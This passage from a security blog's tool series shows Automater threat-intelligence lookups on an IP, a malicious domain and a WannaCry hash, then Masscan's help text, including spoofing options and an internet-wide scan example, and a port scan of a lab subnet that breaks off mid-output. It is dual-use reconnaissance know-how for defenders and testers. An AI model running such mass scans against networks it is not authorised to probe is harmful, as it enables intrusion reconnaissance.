</span><span class='line'>[+] ProjectHoneypot rule break sightings: No results found
</span><span class='line'>[+] ProjectHoneypot first dictionary attack on: No results found
</span><span class='line'>[+] ProjectHoneypot last dictionary attack on: No results found
</span><span class='line'>[+] ProjectHoneypot dictionary attack sightings: No results found
</span><span class='line'>[+] ProjectHoneypot harvester first seen: No results found
</span><span class='line'>[+] ProjectHoneypot harvester last seen: No results found
</span><span class='line'>[+] ProjectHoneypot harvester sightings: No results found
</span><span class='line'>[+] ProjectHoneypot harvester results: No results found</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve used the IP of the Woodmann reverse engineering community. From the output, you can see that it&rsquo;s clean, excepting some files flagged by VirusTotal, as would be expected from a place where executable samples are shared for RE :)</p>

<ul>
<li>check domain for malware</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater corefitness.info
</span><span class='line'>/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
</span><span class='line'>  InsecureRequestWarning)
</span><span class='line'>
</span><span class='line'>____________________     Results found for: corefitness.info     ____________________
</span><span class='line'>No results found in the FNet URL
</span><span class='line'>No results found in the Un Redirect
</span><span class='line'>[+] IP from URLVoid: 76.74.155.21
</span><span class='line'>[+] Blacklist from URLVoid: No results found
</span><span class='line'>[+] Domain Age from URLVoid: 2009-12-08 (8 years ago)
</span><span class='line'>[+] Geo Coordinates from URLVoid: 40.6888 / -74.0203
</span><span class='line'>[+] Country from URLVoid:  (US) United States
</span><span class='line'>[+] pDNS data from VirusTotal: ('2017-04-02', '107.180.51.40')
</span><span class='line'>[+] pDNS data from VirusTotal: ('2016-12-14', '76.74.155.21')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-06-10', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-06-09', 'hxxp://corefitness.info/b/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-06-07', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-04-04', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-03-16', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-03-08', 'hxxp://corefitness.info/workouts/men/arms/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-03-07', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-02-25', 'hxxp://corefitness.info/workouts/women/arms/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-02-05', 'hxxp://corefitness.info/workouts/men/arms/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2016-12-23', 'hxxp://corefitness.info/b/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2016-12-22', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2016-12-21', 'hxxp://corefitness.info/1.exe/')
</span><span class='line'>[+] Malc0de Date: No results found
</span><span class='line'>[+] Malc0de IP: No results found
</span><span class='line'>[+] Malc0de Country: No results found
</span><span class='line'>[+] Malc0de ASN: No results found
</span><span class='line'>[+] Malc0de ASN Name: No results found
</span><span class='line'>[+] Malc0de MD5: No results found
</span><span class='line'>No results found in the THIP
</span><span class='line'>[+] McAfee Web Risk: No results found
</span><span class='line'>[+] McAfee Web Category: No results found
</span><span class='line'>[+] McAfee Last Seen: No results found</span></code></pre></td></tr></table></div></figure>


<p>Here I picked a random URL from the <a href="https://isc.sans.edu/feeds/suspiciousdomains_High.txt">SANS suspicious domains list</a>. It seems that if your search for fitness leads you there, your computer won&rsquo;t be very fit D:</p>

<ul>
<li>chech hash for maliciousness</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06
</span><span class='line'>/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
</span><span class='line'>  InsecureRequestWarning)
</span><span class='line'>
</span><span class='line'>____________________     Results found for: b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06     ____________________
</span><span class='line'>[+] MD5 found on VT: 1
</span><span class='line'>[+] Scan date submitted: 2017-06-09 04:35:58
</span><span class='line'>[+] Detected Engines: 54
</span><span class='line'>[+] Total Engines: 61
</span><span class='line'>[+] Vendor | Classification: ('MicroWorld-eScan', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('nProtect', 'Ransom/W32.WannaCry.Zen')
</span><span class='line'>[+] Vendor | Classification: ('CAT-QuickHeal', 'Ransom.WannaCrypt.A4')
</span><span class='line'>[+] Vendor | Classification: ('McAfee', 'Ransom-WannaCry!4287E15AF619')
</span><span class='line'>[+] Vendor | Classification: ('Malwarebytes', 'Ransom.WannaCrypt')
</span><span class='line'>[+] Vendor | Classification: ('Zillya', 'Trojan.WannaCryptGen.Win32.2')
</span><span class='line'>[+] Vendor | Classification: ('SUPERAntiSpyware', 'Ransom.WannaCrypt/Variant')
</span><span class='line'>[+] Vendor | Classification: ('K7GW', 'Exploit ( 0050d7a31 )')
</span><span class='line'>[+] Vendor | Classification: ('K7AntiVirus', 'Exploit ( 0050d7a31 )')
</span><span class='line'>[+] Vendor | Classification: ('Arcabit', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('Baidu', 'Win32.Worm.Rbot.a')
</span><span class='line'>[+] Vendor | Classification: ('Cyren', 'W32/Trojan.ZTSA-8671')
</span><span class='line'>[+] Vendor | Classification: ('Symantec', 'Ransom.Wannacry')
</span><span class='line'>[+] Vendor | Classification: ('TrendMicro-HouseCall', 'Ransom_WCRY.SMB')
</span><span class='line'>[+] Vendor | Classification: ('Avast', 'Win32:WanaCry-A [Trj]')
</span><span class='line'>[+] Vendor | Classification: ('Kaspersky', 'Trojan-Ransom.Win32.Wanna.m')
</span><span class='line'>[+] Vendor | Classification: ('BitDefender', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('NANO-Antivirus', 'Trojan.Win32.Wanna.eovgam')
</span><span class='line'>[+] Vendor | Classification: ('AegisLab', 'Troj.Ransom.W32.Wanna.toNz')
</span><span class='line'>[+] Vendor | Classification: ('Ad-Aware', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('Emsisoft', 'Trojan-Ransom.WanaCrypt0r (A)')
</span><span class='line'>[+] Vendor | Classification: ('Comodo', 'UnclassifiedMalware')
</span><span class='line'>[+] Vendor | Classification: ('F-Secure', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('DrWeb', 'Trojan.Encoder.11432')
</span><span class='line'>[+] Vendor | Classification: ('VIPRE', 'Trojan.Win32.Generic!BT')
</span><span class='line'>[+] Vendor | Classification: ('TrendMicro', 'Ransom_WCRY.SMB')
</span><span class='line'>[+] Vendor | Classification: ('McAfee-GW-Edition', 'Ransom-WannaCry!4287E15AF619')
</span><span class='line'>[+] Vendor | Classification: ('Sophos', 'Troj/Ransom-EMG')
</span><span class='line'>[+] Vendor | Classification: ('SentinelOne', 'static engine - malicious')
</span><span class='line'>[+] Vendor | Classification: ('F-Prot', 'W32/WannaCrypt.D')
</span><span class='line'>[+] Vendor | Classification: ('Jiangmin', 'Trojan.WanaCry.i')
</span><span class='line'>[+] Vendor | Classification: ('Webroot', 'W32.Ransom.Wannacry')
</span><span class='line'>[+] Vendor | Classification: ('Avira', 'BDS/Agent.ilyda')
</span><span class='line'>[+] Vendor | Classification: ('Endgame', 'malicious (high confidence)')
</span><span class='line'>[+] Vendor | Classification: ('Microsoft', 'Ransom:Win32/WannaCrypt.A!rsm')
</span><span class='line'>[+] Vendor | Classification: ('ZoneAlarm', 'Trojan-Ransom.Win32.Wanna.m')
</span><span class='line'>[+] Vendor | Classification: ('ALYac', 'Trojan.Ransom.WannaCryptor')
</span><span class='line'>[+] Vendor | Classification: ('AVware', 'Trojan.Win32.Generic!BT')
</span><span class='line'>[+] Vendor | Classification: ('VBA32', 'Trojan.Filecoder')
</span><span class='line'>[+] Vendor | Classification: ('ESET-NOD32', 'Win32/Exploit.CVE-2017-0147.A')
</span><span class='line'>[+] Vendor | Classification: ('Tencent', 'Win32.Trojan.Raas.Auto')
</span><span class='line'>[+] Vendor | Classification: ('Yandex', 'Exploit.CVE-2017-0147!')
</span><span class='line'>[+] Vendor | Classification: ('Ikarus', 'Trojan-Ransom.WannaCry')
</span><span class='line'>[+] Vendor | Classification: ('Fortinet', 'W32/WannaCryptor.H!tr')
</span><span class='line'>[+] Vendor | Classification: ('AVG', 'Win32:WanaCry-A [Trj]')
</span><span class='line'>[+] Vendor | Classification: ('Panda', 'Trj/RansomCrypt.I')
</span><span class='line'>[+] Vendor | Classification: ('CrowdStrike', 'malicious_confidence_100% (W)')
</span><span class='line'>[+] Vendor | Classification: ('Qihoo-360', 'HEUR/QVM41.2.2698.Malware.Gen')
</span><span class='line'>[+] Hash found at ThreatExpert: No results found
</span><span class='line'>[+] Malicious Indicators from ThreatExpert: No results found
</span><span class='line'>[+] Date found at VXVault: No results found
</span><span class='line'>[+] URL found at VXVault: No results found
</span><span class='line'>[+] Malc0de Date: No results found
</span><span class='line'>[+] Malc0de IP: No results found
</span><span class='line'>[+] Malc0de Country: No results found
</span><span class='line'>[+] Malc0de ASN: No results found
</span><span class='line'>[+] Malc0de ASN Name: No results found
</span><span class='line'>[+] Malc0de MD5: No results found
</span><span class='line'>No results found in the THMD5</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve grabbed a WannaCry hash and threw it at Automater, you can see it picked it up right away.</p>

<ul>
<li>HTML report of a scan</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/tools/automater.png" title="automater" alt="automater HTML report"></p>

<p><strong>Learn more:</strong></p>

<p>One of the cool features of Automater is its extensibility. You can add sites to the XML configuration file, and customize it to meet your needs. For further instructions about how to do that, check out the <a href="http://www.tekdefense.com/news/2013/12/10/the-extensibility-of-automater.html">author&rsquo;s post</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>__________________________
</span><span class='line'>&lt; Condense soup, not books! &gt;
</span><span class='line'> ---------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Masscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools/"/>
    <updated>2017-06-10T04:17:42-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Nmap is our favorite port scanner, but if you want to scan billions of hosts, and still be relatively young when you get the results, there is a solid alternative focused entirely on speed: Masscan &ndash; the Mass IP port scanner</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>

<h2>masscan description</h2>

<blockquote><p>This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10
million packets per second.</p>

<p>It produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand,
unicornscan, and ZMap, using asynchronous transmission. The major difference is that it&rsquo;s faster than these other
scanners. In addition, it&rsquo;s more flexible, allowing arbitrary address ranges and port ranges.</p>

<p>NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local
TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your
operating system to firewall the ports that masscan uses.</p>

<p>This program spews out packets very fast. On Windows, or from VMs, it can do 300,000 packets/second. On Linux (no
virtualization) it&rsquo;ll do 1.6 million packets-per-second. That&rsquo;s fast enough to melt most networks.</p>

<p>Note that it&rsquo;ll only melt your own network. It randomizes the target IP addresses so that it shouldn&rsquo;t overwhelm any
distant network.</p>

<p>By default, the rate is set to 100 packets/second.</p></blockquote>

<h2>masscan options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan                                                         
</span><span class='line'>usage:
</span><span class='line'>masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
</span><span class='line'> scan some web ports on 10.x.x.x at 10kpps
</span><span class='line'>masscan --nmap
</span><span class='line'> list those options that are compatible with nmap
</span><span class='line'>masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;
</span><span class='line'> save results of scan in binary format to &lt;filename&gt;
</span><span class='line'>masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;
</span><span class='line'> read binary scan results in &lt;filename&gt; and save them as xml in &lt;savefile&gt;</span></code></pre></td></tr></table></div></figure>


<p>More information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan --help
</span><span class='line'>MASSCAN is a fast port scanner. The primary input parameters are the
</span><span class='line'>IP addresses/ranges you want to scan, and the port numbers. An example
</span><span class='line'>is the following, which scans the 10.x.x.x network for web servers:
</span><span class='line'> masscan 10.0.0.0/8 -p80
</span><span class='line'>The program auto-detects network interface/adapter settings. If this
</span><span class='line'>fails, you'll have to set these manually. The following is an
</span><span class='line'>example of all the parameters that are needed:
</span><span class='line'> --adapter-ip 192.168.10.123
</span><span class='line'> --adapter-mac 00-11-22-33-44-55
</span><span class='line'> --router-mac 66-55-44-33-22-11
</span><span class='line'>Parameters can be set either via the command-line or config-file. The
</span><span class='line'>names are the same for both. Thus, the above adapter settings would
</span><span class='line'>appear as follows in a configuration file:
</span><span class='line'> adapter-ip = 192.168.10.123
</span><span class='line'> adapter-mac = 00-11-22-33-44-55
</span><span class='line'> router-mac = 66-55-44-33-22-11
</span><span class='line'>All single-dash parameters have a spelled out double-dash equivalent,
</span><span class='line'>so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).
</span><span class='line'>To use the config file, type:
</span><span class='line'> masscan -c &lt;filename&gt;
</span><span class='line'>To generate a config-file from the current settings, use the --echo
</span><span class='line'>option. This stops the program from actually running, and just echoes
</span><span class='line'>the current configuration instead. This is a useful way to generate
</span><span class='line'>your first config file, or see a list of parameters you didn't know
</span><span class='line'>about. I suggest you try it now:
</span><span class='line'> masscan -p1234 --echo</span></code></pre></td></tr></table></div></figure>


<p>Config file:</p>

<blockquote><p>By default, the program will read default configuration from  the  file
/etc/masscan/masscan.conf. This is useful for system-specific settings,
such as the &mdash;adapter-xxx options. This is also useful for excluded  IP
addresses,  so  that  you  can scan the entire Internet, while skipping
dangerous addresses, like those owned by the DoD, and not make an accidental mistake.</p></blockquote>

<p>Nmap compatible options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan --nmap                                                  
</span><span class='line'>Masscan (https://github.com/robertdavidgraham/masscan)
</span><span class='line'>Usage: masscan [Options] -p{Target-Ports} {Target-IP-Ranges}
</span><span class='line'>TARGET SPECIFICATION:
</span><span class='line'>  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)
</span><span class='line'>  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254
</span><span class='line'>  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
</span><span class='line'>  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
</span><span class='line'>  --excludefile &lt;exclude_file&gt;: Exclude list from file
</span><span class='line'>  --randomize-hosts: Randomize order of hosts (default)
</span><span class='line'>HOST DISCOVERY:
</span><span class='line'>  -Pn: Treat all hosts as online (default)
</span><span class='line'>  -n: Never do DNS resolution (default)
</span><span class='line'>SCAN TECHNIQUES:
</span><span class='line'>  -sS: TCP SYN (always on, default)
</span><span class='line'>SERVICE/VERSION DETECTION:
</span><span class='line'>  --banners: get the banners of the listening service if available. The
</span><span class='line'>    default timeout for waiting to recieve data is 30 seconds.
</span><span class='line'>PORT SPECIFICATION AND SCAN ORDER:
</span><span class='line'>  -p &lt;port ranges&gt;: Only scan specified ports
</span><span class='line'>    Ex: -p22; -p1-65535; -p 111,137,80,139,8080
</span><span class='line'>TIMING AND PERFORMANCE:
</span><span class='line'>  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second
</span><span class='line'>  --connection-timeout &lt;number&gt;: time in seconds a TCP connection will
</span><span class='line'>    timeout while waiting for banner data from a port.
</span><span class='line'>FIREWALL/IDS EVASION AND SPOOFING:
</span><span class='line'>  -S/--source-ip &lt;IP_Address&gt;: Spoof source address
</span><span class='line'>  -e &lt;iface&gt;: Use specified interface
</span><span class='line'>  -g/--source-port &lt;portnum&gt;: Use given port number
</span><span class='line'>  --ttl &lt;val&gt;: Set IP time-to-live field
</span><span class='line'>  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
</span><span class='line'>OUTPUT:
</span><span class='line'>  --output-format &lt;format&gt;: Sets output to binary/list/unicornscan/json/grepable/xml
</span><span class='line'>  --output-file &lt;file&gt;: Write scan results to file. If --output-format is
</span><span class='line'>     not given default is xml
</span><span class='line'>  -oL/-oJ/-oG/-oB/-oX/-oU &lt;file&gt;: Output scan in List/JSON/Grepable/Binary/XML/Unicornscan format,
</span><span class='line'>     respectively, to the given filename. Shortcut for
</span><span class='line'>     --output-format &lt;format&gt; --output-file &lt;file&gt;
</span><span class='line'>  -v: Increase verbosity level (use -vv or more for greater effect)
</span><span class='line'>  -d: Increase debugging level (use -dd or more for greater effect)
</span><span class='line'>  --open: Only show open (or possibly open) ports
</span><span class='line'>  --packet-trace: Show all packets sent and received
</span><span class='line'>  --iflist: Print host interfaces and routes (for debugging)
</span><span class='line'>  --append-output: Append to rather than clobber specified output files
</span><span class='line'>  --resume &lt;filename&gt;: Resume an aborted scan
</span><span class='line'>MISC:
</span><span class='line'>  --send-eth: Send using raw ethernet frames (default)
</span><span class='line'>  -V: Print version number
</span><span class='line'>  -h: Print this help summary page.
</span><span class='line'>EXAMPLES:
</span><span class='line'>  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80
</span><span class='line'>  masscan 23.0.0.0/0 -p80 --banners -output-format binary --output-filename internet.scan
</span><span class='line'>  masscan --open --banners --readscan internet.scan -oG internet_scan.grepable
</span><span class='line'>SEE (https://github.com/robertdavidgraham/masscan) FOR MORE HELP</span></code></pre></td></tr></table></div></figure>


<p>Manpage: <a href="http://manpages.org/masscan/8">http://manpages.org/masscan/8</a></p>

<h2>masscan usage</h2>

<ul>
<li>look at the current configuration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan --echo
</span><span class='line'>rate =     100.00
</span><span class='line'>randomize-hosts = true
</span><span class='line'>seed = 9262294816069822464
</span><span class='line'>shard = 1/1
</span><span class='line'># ADAPTER SETTINGS
</span><span class='line'>adapter = 
</span><span class='line'>adapter-ip = 0.0.0.0
</span><span class='line'>adapter-mac = 00:00:00:00:00:00
</span><span class='line'>router-mac = 00:00:00:00:00:00
</span><span class='line'># OUTPUT/REPORTING SETTINGS
</span><span class='line'>output-format = unknown(0)
</span><span class='line'>show = open,,
</span><span class='line'>output-filename = 
</span><span class='line'>rotate = 0
</span><span class='line'>rotate-dir = .
</span><span class='line'>rotate-offset = 0
</span><span class='line'>rotate-filesize = 0
</span><span class='line'>pcap = 
</span><span class='line'># TARGET SELECTION (IP, PORTS, EXCLUDES)
</span><span class='line'>retries = 0
</span><span class='line'>ports = 
</span><span class='line'>
</span><span class='line'>capture = cert
</span><span class='line'>nocapture = html
</span><span class='line'>nocapture = heartbleed
</span><span class='line'>
</span><span class='line'>min-packet = 60</span></code></pre></td></tr></table></div></figure>


<ul>
<li>check installation</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>masscan --regress
</span><span class='line'>regression test: success!</span></code></pre></td></tr></table></div></figure>


<ul>
<li>full port scan on local subnet</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan -p0-65535 192.168.217.0/24 --rate 100000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-06-10 09:02:34 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning 256 hosts [65536 ports/host]
</span><span class='line'>Discovered open port 443/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 111/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 23/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 21/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.135                                 
</span><span class='line'>Discovered open port 5432/tcp on 192.168.217.133                               
</span><span class='line'>Discovered open port 135/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 25/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 53/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 3632/tcp on 192.168.217.133                               
